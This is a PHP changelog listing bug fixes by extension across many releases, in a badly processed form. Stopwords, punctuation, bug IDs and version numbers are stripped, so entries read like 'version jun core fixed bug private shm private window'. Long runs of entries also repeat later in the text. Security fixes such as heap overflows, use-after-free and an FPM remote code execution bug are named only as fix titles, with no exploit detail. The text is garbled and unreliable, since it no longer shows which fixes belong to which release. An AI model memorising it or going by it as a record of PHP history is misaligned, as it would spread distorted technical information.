fixed bug invalid memory access phpfilterstrip gd fixed bug imagescale add black border imgbicubic openssl fixed bug cause connection timeout pdo sqlite fixed bug pdostatement getcolumnmeta fails empty result set phpdbg fixed bug phpdbg accept input restart execution fixed bug phpdbg fails window error prompt watch array fixed several mostly window related phpdbg bug spl fixed bug reproducible segfault errorhandler gc involved splfileobject standard fixed bug segfault stream invalid data version jun core fixed bug coredump seterrorhandler fixed bug private shm private window fixed bug userini inherit fixed bug regression yielding array based generator fixed bug yield hang invalid value encountered ffi fixed bug ffi vardumping union may segfault gd fixed bug wrong gif header written gd gifencode mysqlnd fixed bug mysql float truncates int locale opcache fixed bug boolean opcache setting ignore onoff value fixed bug preloading segfault inherited method using static variable fixed bug rtd collision opcache standard fixed bug dnsgetrecord fails dnsall version may core fixed bug generator yield item valid call fixed bug casting object array creates reference fixed bug memory leak including unexistent file fixed bug php incompatible party file system demand fixed bug unable interact file inside vfs git repository fixed bug long variable cause oom temp file cleaned fixed bug long variable multipartformdata cause oom temp file cleaned dom fixed bug domnode normalize nt remove empty text node exif fixed bug fails big endian arch fcgi fixed bug search userini extends root dir mbstring fixed bug segfault mbchr internal encoding unsupported openssl fixed bug streamsocketclient throw unknown error sometimes timeout pcre phar fixed bug memory leak duplicate metadata simplexml fixed bug different object xml spl fixed bug debuginfo ignored extending spl class fixed bug arrayobject serialization drop iterator class standard fixed bug sigsegv closing stream handle stream filter appended fixed bug serializing uninitialized typed property sleep throw version apr core fixed bug copy empty array next key unspecified fixed bug invalid pointer address curl fixed bug curlcopyhandle memory leak date fixed bug datetime hour incorrect dst jump forward fixed bug datetimezone loose comparison always true fpm implement request allow numeric ug id fpm listen owner group andre nathan iconv fixed bug iconv function cut opcache fixed bug opcache choke us cpu specific script session fixed bug sessioncreateid fails active session shmop fixed bug integer overflow shmopopen simplexml fixed bug sxe property may lack attribute content soap fixed bug soap request segfaults request parameter missing spl fixed bug splstack unserialize behavior fixed bug null coalescing operator failing splfixedarray standard fixed bug shellexec silently truncates null byte fixed bug system swallow last chunk exactly byte without newline fixed bug oob read urldecode zip fixed bug ziparchive open fails empty file fixed bug phpzipglob us glpathc call globfree version mar core fixed bug getheaders silently truncates null byte fixed bug php crash parsing ini file fixed bug restoreerrorhandler restore previous error mask com fixed bug compersisthelper savetofile save wrong location fixed bug com error constant nt match comexception code fixed bug garbage collecting variant object segfaults fixed bug traversing empty vtarray throw comexception fixed bug comprinttypeinfo print duplicate variable fixed bug phpistreams never freed fixed bug comprinttypeinfo leak memory curl fixed bug copied curl handle upload empty file fixed bug contentlength missing posting curlfile curl dom fixed bug write access violation domimplementation fixed bug domdocumenttype childnodes null enchant fixed bug enchantdictsuggest fails big endian architecture exif fixed bug useofuninitializedvalue exif fileinfo fixed bug segfault libmagic patch contains buffer overflow fpm fixed bug operator displayed instead real error message fixed bug phpfpm primary script unknown mbstring fixed bug mbstrtolower stackbufferoverflow phpunicodetolowerfull mysqli fixed bug mysqli report different clientversion mysqlnd implemented fr support window opcache fixed bug preloading cause phpfpm segfault exit pcre fixed bug memory corruption pregreplacepregreplacecallback unicode fixed bug segmentation fault pregmatch fixed bug duplicate named group j prefer last alternative even matched pdoodbc fixed bug pdostatement nextrowset leak column value reflection fixed bug property heredoc default value return false getdoccomment fixed bug columntype may fail reset standard fixed bug getenv wo argument showing change fixed bug improper injection host header using fopen http request zip fixed bug ziparchive addfile nt honor startlength parameter version feb core fixed bug cscript fail run system fixed bug property nullability lost using multiple property definition fixed bug code returned invalid option fixed bug delayed variance check involving trait segfaults fixed bug cookie value space fail roundtrip fixed bug useafterfree accessing already destructed backtrace argument com fixed bug garbage collecting variant object segfaults curl fixed bug hypothetical useafterfree curlmultiaddhandle ffi fixed bug ffi struct segfault imap fixed bug imap extension ca nt find openssl library configure time intl fixed bug numberformatter format may detect wrong type libxml fixed bug error soapclient ctor disables domdocument save mbstring fixed bug segv mbconvertencoding nonstring encoding mysqli fixed bug property may emit warning vardump mysqlnd fixed bug mysqlnd may fetch wrong column index mysqliboth fixed bug mysql access denied password char opcache fixed bug eval class preload cause class half available fixed bug preloading segfaults preloaduser used fixed bug incorrect type inference self field field openssl fixed bug openssl memory leak phar fixed bug file added tar phar buildfromiterator allaccess permission fixed bug heapbufferoverflow pharextractfile fixed bug pharfileinfo decompress working reflection fixed bug reflectionclass iscloneable call reflected class destruct session fixed bug null pointer dereference php session upload progress standard fixed bug memory leak using streamfilterappend fixed bug passworddefault match passwordbcrypt instead null testing fixed bug take forever finish xsl fixed bug xsl callback node parameter leak memory zip add ziparchive ziparchive cmxz constant since libzip add ziparchive rdonly since libzip add ziparchive er missing constant add ziparchive libzipversion constant fixed bug wrong return ziparchive addemptydir method version jan core preloading support window disabled fixed bug classexists return true class ready used fixed bug plus sign cookie value converted space fixed bug destructor cv freeing cause segfault opline never saved fixed bug abstract method implementation trait check static fixed bug cycle leak using function result temporary fixed bug general performance regression php window fixed bug serializing uninitialized typed property sleep make unserialize throw curl fixed bug curl timeout error specific url post fixed bug curl openssl respect pkgconfigpath date fixed bug undefinedbehavior phpdatec dba fixed bug lmdb mdbmapfull environment mapsize limit reached exif fixed bug nan int cast undefined behavior exif fileinfo fixed bug locale information change mimecontenttype gd fixed bug gdtransformaffinecopy may use unitialized value fixed bug gdtransformaffinecopy change interpolation method libxml fixed bug use free xmlreader xmlwriter mbstring fixed bug global bufferoverflow opcache fixed bug erroneous optimization reassigned globals fixed bug preloading trait method static variable fixed bug conflict rtd key closure result crash fixed bug opcache segfaults inheriting ctor immutable mutable class fixed bug warning opcode handler unusable due aslr fixed bug typed property become unknown opcache file cache pcntl fixed bug converting null string error message bad dx pdopgsql fixed bug pdopgsql find libpqfeh fixed bug pgsqlgetnotify overlook dead connection fixed bug pdopgsql return dead persistent connection session fixed bug heap useafterfree sessioncreateid fixed bug session unserialization problem shmop fixed bug shmop memory leak fixed bug sqlite respect pkgconfigpath compilation spl fixed bug splfileobject fputcsv return failure standard fixed bug oob read phpstriptagsex fixed bug nonblocking socket stream report eagain error fixed bug using empty additionalheaders adding extraneous crlf version dec bcmath fixed bug buffer underflow bcshiftaddsub core fixed bug link silently truncates null byte window fixed bug directoryiterator class silently truncates null byte fixed bug mail may release string twice fixed bug rw fetch throw uninitialized property exception fixed bug calling autoload incorrect eg fakescope value fixed bug isfile fails detect file fixed bug fgets stdin fails window fixed bug calluserfunc parent fails succeed fixed bug uninitialized property trigger get fixed bug segmentation fault symfony cache clear gd fixed bug gd build broken signedcompareslow fixed bug artifact convoluting image transparency exif fixed bug useafterfree exif parsing memory sanitizer fixed bug heapbufferoverflow read exif fpm fixed bug partially working phpfpm ater incomplete reload fixed bug phpfpm service fails start fixed bug phpfpm nt send mail via mail intl implemented fr intl support accounting format mysqlnd fixed bug zliblibs added extralibs opcache fixed x bool x opcache emit undeclared variable notice fixed bug preloading remove class dependency pcre fixed bug pregmatch may return integer reflection fixed bug reflection detects abstract nonstatic class abstract static isimplicitabstract longer used standard fixed bug varexporting certain class instance segfaults fixed bug imploding globals crash fixed bug integer overflow pack cause outofbound access fixed bug striptags allows tag name whitelist bypass version nov core implemented rfc deprecate curly brace syntax accessing array element string offset implemented rfc deprecation php fixed bug crash lexing fixed bug cgi nt properly validate shebang line contains fixed bug selfassignment list may inconsistent behavior fixed bug use free gc certain destructors fixed bug inconsistent warning case stdobj created fly implemented fr add arraykeyexists list specially compiled function fixed bug method inconsistent outside method fixed bug alias inheritance type check affected opcache implemented fr support custom cflags ldflags environment fixed bug stack overflow caused circular reference garbage collection fixed bug interactive mode support php heredoc fixed bug calluserfunc pass static method fixed bug php eats first byte program come process substitution fixed bug segfault caused indirect expression php fixed bug sendvarnoref always send reference fixed bug segmentation fault byreference property assignment fixed bug segfault builtin webserver fixed bug ca nt access onedrive folder fixed bug unexpected set behavior typed property fixed bug deprecation notice string conversion converted exception hang fixed bug static propertiesvariables containing cycle report leak fixed bug include stream wrapper reading whole file fixed bug segmentation fault zendcheckprotected fixed bug array returned arrayaccess incorrectly unpacked argument fixed bug cast object confuses gc cause crash fixed bug fstat mode unexpected value php fixed bug second fileputcontents shutdown hang script fixed bug broken file includes userdefined stream filter fixed bug corruption unserializing deeply nested structure fixed bug parse error due heredoc identifier followed digit fixed bug consecutive numeric separator cause oom error fixed bug pear installation failure fixed bug crash using undefined variable object fixed bug autodetectlineendings value parsed bool fixed bug tokengetall properly tokenize foo php fixed bug compile dtrace anymore fixed bug memory error fixed bug methodexists work differently checking priv method fixed bug segfault zendunsetobjspecvarconsthandler fixed bug memory corruption using closure bindto fixed bug parse error classified highest loglevel fixed bug streamwrite bad error detection fixed bug redefinition typedef zendpropertyinfo fixed bug configure generates invalid phpversionh fixed incorrect usage qmassign instruction must return isvar side effect allowed passing left hand list reference instead compiletime error cli builtin cli server report request method log file com deprecated registering caseinsensitive constant typelibs fixed bug new com crash fixed bug appending variant array cause segfault curl fixed bug use curlmultiwait timeouts respected implemented fr curlfile support unicode filename deprecated deprecated version parameter curlversion date updated timelib fixed bug discrepency time microtime fixed bug dateinterval incorrectly unserialized fixed bug printr datetime creating sideeffect fixed bug casting datetime array longer return property fixed bug serialising dateperiod convert datetimeimmutable exif fixed bug exif crash bus error due wrong alignment invalid cast fixed bug heapbufferoverflow exifprocessusercomment fixed bug heapbufferoverflow exifscanthumbnail fileinfo fixed bug finfofile treat json file textplain fixed bug finfofile show wrong mimetype tga file filter filter extension longer withpcredir unix build allowing extension compiled shared using configure added minrange maxrange option filtervalidatefloat ffi added ffi extension fixed bug oob zendfunction ffitrampoline fixed bug iscallable fficdata throw exception fixed bug function name mangling wrong parameter type fixed bug failing ffi cast may leak memory fixed bug zend memory heap corruption preload casting implement fr support vectorcall convention ffi added missing ffi isnull fpm implemented fr systemd service hardened fixed bug master phpfpm stopped multiple reloads fixed bug fpm log prefix message includes wrong stdoutstderr notation fixed bug envpathinfo underflow fpmmainc lead rce gd implemented scatter filter imgfilterscatter bundled libgd behaves like system libgd wrt imgcropdefault never falling back imgcropsides default mode parameter imagecropauto changed imgcropdefault passing deprecated added support aspect ratio preserving scaling fixed height imagescale added tga read support fixed bug imagecropauto threshold differs external libgd fixed bug detect recent version freetype pkgconfig fixed bug missing freetype supportfunctions external gd gmp fixed bug broken shared build hash iconv fixed bug bus error configure test iconv ignore fixed bug wrong libiconv version displayed libxml fixed bug libxmldisableentityloader setting shared request cgifcgi interbase unbundled interbase extension moved pecl intl raised requirement icu changed resourcebundle implement countable changed default variant parameter idntoascii ldap deprecated ldapcontrolpagedresultresponse ldapcontrolpagedresult litespeed updated litespeed sapi fixed clean shutdown updated litespeed sapi increased response header count limit added crash handler cleanly shutdown php request added cloudlinux modlsapi mode fixed bug post data ca nt buffered using php input make huge tmp file mbstring fixed bug mbfunctions respect defaultencoding fixed bug mbdecodenumericentity args number inconsistency fixed bug mbcheckencoding longer support stringable object mysqli fixed bug reading dbc stat modifies dbc affectedrows fixed bug ssl setting nt respected persistent connection used fixed bug mariadb server version incorrectly detected fixed bug empty row pocket mysqlnd fixed connectattr issue added serverhost connection attribute fixed bug mysqlnd expose line stats phpinfo odbc fixed bug odbcclose close arbitrary resource opcache implemented preloading rfc add opcachepreloaduser ini directive added new ini directive opcachecacheid window fixed bug path resolution fails opcache disabled request fixed bug preloading segfaults preload time runtime fixed bug opcache stats cache hit capped num fixed bug invalid result ifelse fixed bug failure detect smart branch dfa pas fixed bug incorrect preloading constant static property fixed bug opcachecompilefile file segfaults fixed bug make preload work fixed bug preloading segfaults inherited typed property fixed bug incorrectly computed opcache checksum file nonascii character openssl added tl support stream including new stream added function opensslrandompseudobytes throw error condition changed default config path window fixed bug segmentation fault upon streamsocketaccept exported sockettostream fixed bug assertion failure opensslrandompseudobytes fixed bug tl issue http request affecting encrypted connection pcntl fixed bug php preventing sigalrm specifying sarestart pcre implemented fr support flag pregreplacecallback fixed bug repeated validation string mode fixed bug pregmatchall return null trailing optional capture group fixed bug array crossborder reading pcre fixed bug bundled library missing licence file pdo implemented fr allow escaping question mark placeholder http wikiphpnetrfcpdoescapeplaceholders fixed bug disable cloning pdo handleconnection object implemented fr pdo support username password specified dsn pdofirebird implemented fr pdofirebird also support dialect implemented fr pdo firebird support type boolean input parameter pdomysql fixed bug sp call yield additional empty result set fixed bug regression caused sp call yield additional empty result set pdooci support oracle database tracing attribute action module clientinfo clientidentifier implemented fr pdooci getcolumnmeta implemented pdosqlite implemented sqlitestmtreadonly pdosqlite raised requirement sqlite fixed bug segfault reuse statement schema changed fixed bug remove lrt pdosqliteso phar fixed bug potential uaf phar rshutdown phpdbg fixed bug phpdbg support displayerrorsstderr fixed bug many open file fixed bug phpdbg segfaults listing conditional breakpoints fixed bug phpdbg build fails readline shared recode unbundled recode extension reflection fixed bug unserialized reflection object broken nt serializable fixed bug reflectionreference fromarrayelement return null item reference fixed bug manually unserialize class final extends internal one fixed bug reflectionclass implementsinterface inaccurate error message trait fixed bug reflectionnamedtype typed property crash session fixed bug sessiongc return value user defined session handler simplexml implemented fr simplexmlelement could register implementing countable fixed bug nt set content element whitespaces socket fixed bug validate length socketwrite fixed bug multicasting may leak memory sodium fixed bug signdetached string terminated fixed bug partially uninitialized buffer returned sodiumcryptogenerichashinit fixed bug passwordhash memory cost allowed range spl fixed bug seekableiterator seek accept int typehint documented fixed bug segfault creating instance arrayiterator without constructor fixed bug missing addref splpriorityqueue extrboth mode fixed bug segfault serializing spldoublylinkedlist unbundled libsqlite raised requirement sqlite forbid un serialization added support sqlite name notation added getsql retrieve sql statement implement fr make online backup api available standard implemented rfc password hashing registry implemented rfc passwordhash implementation extsodium php built without libargon implemented fr field enclosure behavior fputcsv implemented fr fgetcsv take empty string escape fixed bug phpsockopwrite return error used trigger denial service fixed bug bindto work filegetcontents fails streamsocketclient fixed bug streamgetline skip data used datagenerating filter implemented fr way handle ctrlc window fixed bug streamcopytostream use mmap often implemented fr make procopen accept command array fixed bug passwordneedsrehash unknown algo always return true fixed bug touch handle date php fixed bug atime mtime mismatch fixed bug improper memory deallocation streamgetcontents fixed length buffer fixed bug striptags longer handling nested php tag fixed bug error phpuserfilter filter reported fixed bug stack overflow due nested serialized input fixed bug arraysearch globals testing fixed bug pcre test sending email linux tidy added tidytag constant element fixed bug wrong reflection tidygethead tidygethtml tidygetroot tidygetopt wddx deprecated unbundled wddx extension zip fixed bug addglob modify given removepath value version aug apache fixed bug upgrade phpapachesapigetrequesttime return usec core fixed bug getimagesize function silently truncates null byte fixed bug assertion failure dumping closure unresolved static variable fixed bug ht iterators removed empty array destroyed com fixed bug bstr php string conversion binary safe fixed bug dcom work username password parameter curl fixed bug curlsetopt curloptpostfields asserts object declared property fileinfo fixed bug finfofile crash fileinfomime ftp fixed bug ftpsize large file mbstring fixed bug mbstrimwidth trim string phar fixed bug use freed hash key pharparsezipfile function standard fixed bug ca nt copy large data openbasedir fixed bug strreplace handle indirect element fixed bug dnscheckrecord always return true alpine version jul core fixed bug phpwinexe cpu lockup fixed bug getdefinedfunctions true may miss function fixed possibly unsupported timercmp usage exif fixed bug sony picture php warning make model makernotes filter fixed bug invalid memory access phpfilterstrip gd fixed bug imagescale add black border imgbicubic openssl fixed bug cause connection timeout pdo sqlite fixed bug pdostatement getcolumnmeta fails empty result set spl fixed bug reproducible segfault errorhandler gc involved splfileobject standard fixed bug segfault stream invalid data version jun core fixed bug private shm private window fixed bug userini inherit gd fixed bug wrong gif header written gd gifencode mysqlnd fixed bug mysql float truncates int locale opcache fixed bug php crash specific opcacheoptimizationlevel fixed bug boolean opcache setting ignore onoff value standard fixed bug dnsgetrecord fails dnsall version may core fixed bug long filename cause oom temp file cleaned fixed bug long variable multipartformdata cause oom temp file cleaned fixed bug php crash nullpointer dereference c constant fixed bug casting object array creates reference fixed bug php incompatible party file system demand fixed bug unable interact file inside vfs git repository dom fixed bug domnode normalize nt remove empty text node fcgi fixed bug search userini extends root dir mbstring fixed bug segfault mbchr internal encoding unsupported openssl fixed bug streamsocketclient throw unknown error sometimes timeout phar fixed bug memory leak duplicate metadata simplexml fixed bug different object xml standard fixed bug sigsegv closing stream handle stream filter appended version apr core fixed bug copy empty array next key unspecified fixed bug invalid pointer address curl fixed bug curlcopyhandle memory leak date fixed bug datetime hour incorrect dst jump forward iconv fixed bug iconv function cut opcache fixed bug opcache choke us cpu specific script session fixed bug sessioncreateid fails active session shmop fixed bug integer overflow shmopopen simplexml fixed bug sxe property may lack attribute content spl fixed bug splstack unserialize behavior fixed bug null coalescing operator failing splfixedarray standard fixed bug shellexec silently truncates null byte fixed bug oob read urldecode fixed bug system swallow last chunk exactly byte without newline zip fixed bug ziparchive open fails empty file fixed bug phpzipglob us glpathc call globfree version mar core fixed bug restoreerrorhandler restore previous error mask com fixed bug compersisthelper savetofile save wrong location fixed bug com error constant nt match comexception code fixed bug traversing empty vtarray throw comexception fixed bug comprinttypeinfo print duplicate variable fixed bug phpistreams never freed fixed bug comprinttypeinfo leak memory dom fixed bug write access violation domimplementation fixed bug domdocumenttype childnodes null enchant fixed bug enchantdictsuggest fails big endian architecture exif fixed bug useofuninitializedvalue exif mbstring fixed bug mbstrtolower stackbufferoverflow phpunicodetolowerfull mysqli fixed bug mysqli report different clientversion pcre fixed bug memory corruption pregreplacepregreplacecallback unicode pdoodbc fixed bug pdostatement nextrowset leak column value reflection fixed bug property heredoc default value return false getdoccomment fixed bug columntype may fail reset standard fixed bug getheaders silently truncates null byte fixed bug getenv wo argument showing change fixed bug improper injection host header using fopen http request version feb core fixed bug memory corruption htmlspecialchars charset supported fixed bug cscript fail run system fixed bug code returned invalid option fixed bug useafterfree accessing already destructed backtrace argument curl fixed bug hypothetical useafterfree curlmultiaddhandle intl fixed bug numberformatter format may detect wrong type libxml fixed bug error soapclient ctor disables domdocument save mbstring fixed bug mbconvertencoding modify fromencoding mysqlnd fixed bug mysqlnd may fetch wrong column index mysqliboth openssl fixed bug openssl memory leak phar fixed bug file added tar phar buildfromiterator allaccess permission fixed bug heapbufferoverflow pharextractfile fixed bug pharfileinfo decompress working reflection fixed bug reflectionclass iscloneable call reflected class destruct session fixed bug null pointer dereference php session upload progress spl fixed bug heap use free caused spldllistithelpermoveforward standard fixed bug memory leak using streamfilterappend testing fixed bug take forever finish xsl fixed bug xsl callback node parameter leak memory version jan core fixed bug cycle leak using function result temporary curl fixed bug curl timeout error specific url post date fixed bug undefinedbehavior phpdatec dba fixed bug lmdb mdbmapfull environment mapsize limit reached fileinfo fixed bug locale information change mimecontenttype gd fixed bug artifact convoluting image transparency fixed bug gdtransformaffinecopy may use unitialized value fixed bug gdtransformaffinecopy change interpolation method libxml fixed bug use free xmlreader xmlwriter mbstring fixed bug global bufferoverflow opcache fixed bug warning opcode handler unusable due aslr pcntl fixed bug converting null string error message bad dx pdopgsql fixed bug pdopgsql find libpqfeh fixed bug pgsqlgetnotify overlook dead connection fixed bug pdopgsql return dead persistent connection session fixed bug heap useafterfree sessioncreateid shmop fixed bug shmop memory leak standard fixed bug oob read phpstriptagsex fixed bug using empty additionalheaders adding extraneous crlf version dec bcmath fixed bug buffer underflow bcshiftaddsub core fixed bug link silently truncates null byte window fixed bug directoryiterator class silently truncates null byte fixed bug mail may release string twice fixed bug segfault trait overriding inherited private shadow property fixed bug calling autoload incorrect eg fakescope value fixed bug isfile fails detect file exif fixed bug useafterfree exif parsing memory sanitizer fixed bug heapbufferoverflow read exif gd fixed bug gd build broken signedcompareslow mbstring upgraded bundled oniguruma opcache fixed potential aslr related invalid opline handler issue fixed x bool x opcache emit undeclared variable notice pcre fixed bug pregmatch may return integer standard fixed bug arraysearch globals fixed bug varexporting certain class instance segfaults fixed bug imploding globals crash fixed bug integer overflow pack cause outofbound access fixed bug striptags allows tag name whitelist bypass version nov core fixed bug memory corruption using closure bindto fixed bug parse error classified highest loglevel fixed bug segfault gc triggered generator stack frame destroyed fixed bug closure fromcallable nt handle closure invoke com fixed bug appending variant array cause segfault date fixed bug dateinterval incorrectly unserialized fixed bug serialising dateperiod convert datetimeimmutable iconv fixed bug wrong libiconv version displayed opcache fixed bug incorrectly computed opcache checksum file nonascii character fixed bug opcache corrupts custom extension result openssl fixed bug tl issue http request affecting encrypted connection reflection fixed bug reflectionclass implementsinterface inaccurate error message trait socket fixed bug multicasting may leak memory version oct core fixed bug autodetectlineendings value parsed bool fixed bug memory error exif fixed bug illegal component exifreaddata since kalle fpm fixed bug envpathinfo underflow fpmmainc lead rce fixed bug requestterminatetimeout take effect fastcgifinishrequest mbstring fixed bug heap buffer overflow read mberegi fixed bug mbdecodenumericentity args number inconsistency fixed bug mbcheckencoding longer support stringable object mysqli fixed bug ssl setting nt respected persistent connection used mysqlnd fixed bug memory leak pdo reusing native prepared statement pcre fixed bug calling pregmatch pcntlfork freeze child process pdomysql fixed bug regression caused sp call yield additional empty result set session fixed bug sessiongc return value user defined session handler standard fixed bug filegetcontents wait twice specified timeout fixed bug strtr leak memory integer key used subject string shorter fixed bug streamgetline skip data used datagenerating filter zip fixed bug addglob modify given removepath value version sep core fixed bug ca nt access onedrive folder fixed bug double release doc comment inherited shadow property fixed bug parse error due heredoc identifier followed digit fixed bug interactive mode support php heredoc fastcgi fixed bug fastcgi onaccept hook called using named pipe window fpm fixed bug fpm log prefix message includes wrong stdoutstderr notation intl ensure rule used idntoascii requested mbstring fixed bug heap buffer overflow mberegi mysqlnd fixed connectattr issue added serverhost connection attribute odbc fixed bug odbcclose close arbitrary resource pdomysql fixed bug sp call yield additional empty result set sodium fixed bug partially uninitialized buffer returned sodiumcryptogenerichashinit version aug core fixed bug buffer overflow zendparse fixed bug cast object confuses gc cause crash fixed bug generator incorrectly report nonreleasable gc child curl fixed bug bad curl resource returned curlmultiinforead exif fixed bug exif crash bus error due wrong alignment invalid cast fpm fixed bug useafterfree fpm master event handling iconv fixed bug bus error configure test iconv ignore litespeed updated litespeed sapi fixed clean shutdown mbstring fixed bug oniguruma fix cf mysqlnd fixed bug mariadb server version incorrectly detected fixed bug empty row pocket opcache fixed bug assertion failure dceliveranges silencing used standard fixed bug bus error streamcopytostream file ssl stream invalid length fixed bug atime mtime mismatch fixed bug improper memory deallocation streamgetcontents fixed length buffer fixed bug striptags longer handling nested php tag version aug core added syslogfilterraw option fixed bug segfault builtin webserver date fixed bug discrepency time microtime updated timelib exif fixed bug heapbufferoverflow exifprocessusercomment fixed bug heapbufferoverflow exifscanthumbnail ftp fixed bug ftp ssl memory leak libxml fixed bug libxmldisableentityloader setting shared request cgifcgi litespeed updated litespeed sapi increased response header count limit added crash handler cleanly shutdown php request added cloudlinux modlsapi mode fixed bug post data ca nt buffered using php input make huge tmp file openssl fixed bug segmentation fault upon streamsocketaccept exported sockettostream opcache fixed bug failure detect smart branch dfa pas fixed bug file cache strip last character uname hash fixed bug opcache stats cache hit capped num fixed bug invalid result ifelse fixed bug opcachegetconfiguration nt list directive pcre fixed bug array crossborder reading pcre fixed bug version check configure fails xxx version string pdosqlite fixed bug segfault reuse statement schema changed phar fixed bug potential uaf phar rshutdown phpdbg fixed bug include unexistent file memory leak sqlite upgraded sqlite standard fixed bug touch handle date php fixed bug passwordhash us weak option version jul core fixed bug interface get skipped autoloader throw exception dom fixed bug segfault accessing property domdocumenttype mysqli fixed bug mysqliallowlocalinfile use meaningful error message fixed bug bindparam incorrect processing bool type mysqlnd fixed bug random segmentation fault mysqlnd phpfpm opcache fixed bug incorrect evaluation expression involving partial array sccp fixed bug path resolution fails opcache disabled request openssl fixed bug opensslencryptccmphpt fails openssl phpdbg fixed bug segfault phpdbg opcache include file twice socket fixed bug socketselect fails resource array contains reference sodium fixed bug segfault calling sodium function eval standard fixed bug extract extrskip skip fixed bug pregmatch failed zip fixed bug ziph found version may curl implemented fr add missing curlversion constant date fixed bug dateperiod construct invalid recurrence count value exif fixed bug heapbufferoverflow fpm fixed bug phpfpm kill working fixed bug staticphpnet nt work anymore gd fixed bug imageantialias image false work fixed bug uninitialized read gdimagecreatefromxbm iconv fixed bug outofbounds read iconvc phpiconvmimedecode due integer overflow json fixed bug use free json serializer opcache fixed possible crash inconsistent pcre cache opcache shm reset pdomysql fixed bug wrong meta pdotype bigint reflection fixed bug inconsistent reflection closure invoke session fixed bug wrong warning sessionsidbitspercharacter soap fixed bug segmentation fault constructing soapclient wsdlcacheboth spl fixed bug splfileobject tostring may return array sqlite fixed bug bypassing openbasedir restriction via file uris standard fixed bug warning arraymap mention wrong type fixed bug striptags output change since php version may core fixed bug arrayiterator stop iterating offsetset call cli fixed bug incorrect date header format builtin server exif fixed bug heapbufferoverflow estrndup via exifprocessifdtag interbase fixed bug impossibility creating multiple connection interbase php intl fixed bug intldateformatter create fails strict mode locale null litespeed litespeed sapi better process management new api function litespeedfinishrequest ldap fixed bug core dump using server control mcmic mail fixed bug potential heap corruption tsendmail mbstring implemented fr implement regex stack limit mbregex function mysqli fixed bug unbuffered query leak memory mysqli mysqlnd pcre fixed bug pregmatch ignore r regex flag pdo fixed bug disable cloning pdo handleconnection object phpdbg fixed bug many open file fixed bug phpdbg segfaults listing conditional breakpoints fixed bug phpdbg build fails readline shared reflection fixed bug reflectionclass getmethods null nt work fixed bug different behavior always call destructor standard fixed bug segmentation fault extract overwriting reference fixed bug crash due null pointer parseinistring iniscannertyped fixed bug inconsistent substrcompare behaviour empty haystack version apr core fixed bug nullptr deref zendcompileexpr fixed bug segmentation fault break fixed bug anonymous class lose interface information fixed bug stack overflow caused circular reference garbage collection fixed bug wrong value syslogfilter documented phpini fixed bug bom bcmath fixed bug bcpow implementation related gcc compiler optimization cli server fixed bug incorrect ip set server remoteaddr localhost com fixed bug crash php unload exif fixed bug heapbufferoverflow fixed bug heapbufferoverflow exifiifaddvalue fpm fixed bug fpm fails build aix due missing wcoredump gd fixed bug writing truecolor image gif ignores interlace flag mysqli fixed bug mysqlifetchfield hang script opcache fixed bug incorrect pi node insertion jmpznz identical successor pcre fixed bug pregsplit raise error invalid phar fixed bug crash bigendian platform phpdbg fixed bug phpdbg break cmd alias listed help match actual alias sodium fixed bug signdetached string terminated added ini directive standard fixed bug segmentation fault using undefined constant custom wrapper fixed bug crash extract overwriting extracted array fixed bug varexport create parsable value phpintmin fixed bug ftp stream wrapper set directory executable version mar core fixed bug core dump using parseinistring numeric section fixed bug buffer overflow via overly long error message fixed bug disabling class cause segfault member access fixed bug custom extension segmentation fault declare static property fixed bug php crash parsing class fixed bug iptcembed broken function fixed bug rename across device may allow unwanted access processing com fixed bug already defined constant properly reported fixed bug persistence confusion phpcomimporttypelib exif fixed bug uninitialized read exifprocessifdintiff fixed bug invalid read exifprocesssofn fixed bug uninitialized read exifprocessifdinmakernote fixed bug uninitialized read exifprocessifdinmakernote mbstring fixed bug mberegreplace trailing backslash add null byte mysql disabled local infile default enabled using phpini directive mysqliallowlocalinfile mysqli pdo mysqlattrlocalinfile attribute pdomysql openssl fixed bug feof might hang tl stream case fragmented tl record pdooci support oracle database tracing attribute action module clientinfo clientidentifier phar fixed bug null pointer dereference pharcreateorparsefilename fixed bug phartarwriteheadersint buffer overflow phpdbg fixed bug phpdbg support displayerrorsstderr spl fixed bug directoryiterator glob nt support current path relative query fixed bug openfile silently truncates null byte standard fixed bug unintialized phpstreamstatbuf stat function fixed bug setcookie set incorrect samesite header option filled version feb core fixed bug memcpy negative length via crafted dns response fixed bug recursion detection broken printing globals fixed bug undefined function message longer includes namespace fixed bug doest work nested vm fixed bug callstatic may get incorrect argument fixed bug dir file realpath reveal physical path subst virtual drive fixed bug segfault using recursivefilteriterator fixed bug php built asan crash fixed bug zend engine crash calling realpath invalid working dir curl fixed bug segfault server push fileinfo fixed bug webm file incorrectly detected applicationoctetstream fpm fixed bug phpfpm crash main process exited codedumped gd fixed bug imagescale imgbilinearfixed cause black border fixed bug gdimagefilledarc nt properly draw pie fixed bug imagescale may return image resource failure fixed bug bmps may fail loaded fixed bug imagewbmp segfaults large image ldap fixed bug ldapbind using ldaps ldapstarttls exception mbstring fixed bug mberegreplace nt replace substitution variable fixed bug mbscrub silently truncates null byte mysqlnd fixed bug unbuffered query memory leak fixed bug mysqlndextpluginh plugin method family external visibility opcache fixed bug assertion failed dceliveranges fixed bug value variable assigned switch construct get lost fixed bug phpfpm worker segfaulting zendgcaddre fixed bug configure fails aix opcache enabled fixed bug opcache literal compaction incompatible ext opcodes pcre fixed bug getbrowser empty string pdo fixed bug arraywalkrecursive corrupts value type leading pdo failure pdo mysql fixed bug pdo mysql segfaults persistent connection soap fixed bug segmentation fault executing method empty parameter socket fixed bug socketrecvfrom may return invalid address macos spl fixed bug segfault occurs add property unserialized empty arrayobject standard fixed bug segfault arraymultisort fixed bug parsestr segfaults inserting item existing array version jan core fixed bug build failure mac o x intel fixed bug zendsignalstartup need zendapi fixed bug php generates fefree opcode wrong line fixed bug magic method inherited trait may ignored curl fixed bug curlgetinfo returning microsecond second com fixed bug serializing unserializing com object crash exif fixed bug unsigned rational number written signed rational gd fixed bug incorrect error handling imagecreatefromjpeg fixed bug auto cropping insufficient precision fixed bug imagecropauto gdcropsides crop left right fixed bug efree uninitialized heap data imagescale lead useafterfree fixed bug imagecolormatch bound write heap mbstring fixed bug negative size parameter mbsplit fixed bug buffer overflow mb regex function fetchtoken fixed bug heap buffer overflow mb regex function compilestringnode fixed bug heap buffer overflow multibyte matchat fixed bug heap buffer overflow due incorrect length expandcasefoldstring fixed bug buffer overflow fetchtoken fixed bug buffer overflow multibyte case folding unicode fixed bug heap overflow fixed bug ocipconnect ocicredext working added ocisetcalltimeout call timeouts added ocisetdboperation dbop endtoendtracing attribute opcache fixed bug cfg assertion failure multiple finalizing switch free one block fixed bug opcache optimization problem arrayaccess offsetget pcre fixed bug infinite loop pregreplacecallback pdo handle invalid index passed pdostatement 